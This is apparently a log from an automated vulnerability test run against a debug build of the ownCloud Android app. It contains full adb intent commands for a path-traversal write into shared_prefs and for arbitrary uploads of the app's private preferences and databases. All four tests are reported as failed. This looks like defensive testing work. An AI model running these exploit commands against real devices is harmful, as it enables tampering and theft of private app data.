@@ -1,0 +1,90 @@
+[INFO] Attempt to enable ADB root. May take a second to reboot
+[INFO] ROOT ACCESS ENABLED!
+[INFO] Starting vulnerability test framework
+[INFO] Running 4 enabled test cases
+[INFO] Note: Assumes app is installed and environment is ready
+[INFO] Capturing initial state...
+[INFO] Snapshot saved to: output/20250801_115726-data/before_local_dir.json
+[INFO] Pulling databases from: /data/data/com.owncloud.android.debug/databases
+[INFO] Saving to: output/20250801_115726-data/before_databases
+[INFO] Pulling: filelist
+[INFO] Pulled: filelist
+[INFO] Pulling: filelist-shm
+[INFO] Pulled: filelist-shm
+[INFO] Pulling: filelist-wal
+[INFO] Pulled: filelist-wal
+[INFO] Pulling: owncloud_database
+[INFO] Pulled: owncloud_database
+[INFO] Pulling: owncloud_database-shm
+[INFO] Pulled: owncloud_database-shm
+[INFO] Pulling: owncloud_database-wal
+[INFO] Pulled: owncloud_database-wal
+[INFO] All databases pulled to: ./output/20250801_115726-data/before_databases/
+[INFO] [>] Running exploit: overwrite config file
+[INFO] Executing exploit...
+[INFO] Executing path traversal write exploit: ['adb', 'shell', 'am', 'start', '-n', 'com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity', '-t', 'text/plain', '-a', 'android.intent.action.SEND', '--es', 'android.intent.extra.TEXT', 'TryingToOverwriteConfig', '--es', 'android.intent.extra.TITLE', '../shared_prefs/malware.config']
+[INFO] Automating upload button click (two-step process)
+[INFO] Trying known coordinates for initial upload button...
+[INFO] Clicked initial upload button at (789, 1689)
+[INFO] Trying known coordinates for dialog upload button...
+[INFO] Clicked dialog upload button at (794, 1099)
+[INFO] [✅] Exploit executed: True
+[INFO] Execution time: 4.37s
+[INFO] [>] Running exploit: upload private config file to cloud
+[INFO] Executing exploit...
+[INFO] Executing arbitrary file upload: ['adb', 'shell', 'am', 'start', '-n', 'com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity', '-t', 'text/plain', '-a', 'android.intent.action.SEND', '--eu', 'android.intent.extra.STREAM', 'file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml']
+[INFO] Automating upload button click (two-step process)
+[INFO] Trying known coordinates for initial upload button...
+[INFO] Clicked initial upload button at (789, 1689)
+[INFO] Trying known coordinates for dialog upload button...
+[INFO] Clicked dialog upload button at (794, 1099)
+[INFO] [✅] Exploit executed: True
+[INFO] Execution time: 4.30s
+[INFO] [>] Running exploit: upload database filelist
+[INFO] Executing exploit...
+[INFO] Executing arbitrary file upload: ['adb', 'shell', 'am', 'start', '-n', 'com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity', '-t', 'text/plain', '-a', 'android.intent.action.SEND', '--eu', 'android.intent.extra.STREAM', 'file:///data/user/0/com.owncloud.android.debug/cache/../databases/filelist']
+[INFO] Automating upload button click (two-step process)
+[INFO] Trying known coordinates for initial upload button...
+[INFO] Clicked initial upload button at (789, 1689)
+[INFO] Trying known coordinates for dialog upload button...
+[INFO] Clicked dialog upload button at (794, 1099)
+[INFO] [✅] Exploit executed: True
+[INFO] Execution time: 4.29s
+[INFO] [>] Running exploit: upload database owncloud
+[INFO] Executing exploit...
+[INFO] Executing arbitrary file upload: ['adb', 'shell', 'am', 'start', '-n', 'com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity', '-t', 'text/plain', '-a', 'android.intent.action.SEND', '--eu', 'android.intent.extra.STREAM', 'file:///data/user/0/com.owncloud.android.debug/cache/../databases/owncloud_database']
+[INFO] Automating upload button click (two-step process)
+[INFO] Trying known coordinates for initial upload button...
+[INFO] Clicked initial upload button at (789, 1689)
+[INFO] Trying known coordinates for dialog upload button...
+[INFO] Clicked dialog upload button at (794, 1099)
+[INFO] [✅] Exploit executed: True
+[INFO] Execution time: 4.30s
+[INFO] Capturing final state...
+[INFO] Snapshot saved to: output/20250801_115726-data/after_local_dir.json
+[INFO] Pulling databases from: /data/data/com.owncloud.android.debug/databases
+[INFO] Saving to: output/20250801_115726-data/after_databases
+[INFO] Pulling: filelist
+[INFO] Pulled: filelist
+[INFO] Pulling: filelist-shm
+[INFO] Pulled: filelist-shm
+[INFO] Pulling: filelist-wal
+[INFO] Pulled: filelist-wal
+[INFO] Pulling: owncloud_database
+[INFO] Pulled: owncloud_database
+[INFO] Pulling: owncloud_database-shm
+[INFO] Pulled: owncloud_database-shm
+[INFO] Pulling: owncloud_database-wal
+[INFO] Pulled: owncloud_database-wal
+[INFO] All databases pulled to: ./output/20250801_115726-data/after_databases/
+[INFO] Analyzing all results...
+[INFO] Filesystem diff saved to output/20250801_115726-data/fs_changes.json
+[INFO] Database diff saved to output/20250801_115726-data/db_changes.json
+[INFO] Loaded Database changes from output/20250801_115726-data/db_changes.json
+[INFO] Loaded File System changes from output/20250801_115726-data/fs_changes.json
+[INFO] Test Summary:
+[INFO]   Total: 4
+[INFO]   Passed: 0
+[INFO]   Failed: 4
+[INFO]   Errors: 0
+[INFO] Results saved to: output/20250801_115726-data/test_results.json
